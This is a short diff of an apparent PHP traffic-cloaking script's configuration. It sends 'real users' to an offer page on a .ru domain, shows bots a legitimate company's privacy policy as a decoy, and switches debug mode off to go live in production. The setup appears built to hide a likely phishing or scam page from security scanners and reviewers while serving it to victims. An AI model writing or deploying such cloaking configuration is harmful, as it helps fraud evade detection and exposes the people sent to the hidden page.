@@ -5,7 +5,7 @@ $HCSET['PASSIVE'] = false;
 /* Required settings     */
 $HCSET['OFFER_PAGE'] = 'https://techluminizesa.ru/Ma4Y/';//PHP/HTML file or URL offer used for real users
 $HCSET['WHITE_PAGE'] = 'https://monday.com/l/privacy/privacy-policy/';//PHP/HTML file or URL used for bots
-$HCSET['DEBUG_MODE'] = 'on';// replace "on" with "off" to switch from debug to production mode
+$HCSET['DEBUG_MODE'] = 'off';// replace "on" with "off" to switch from debug to production mode
 /*********************************************/
 /* Available additional settings  */
 
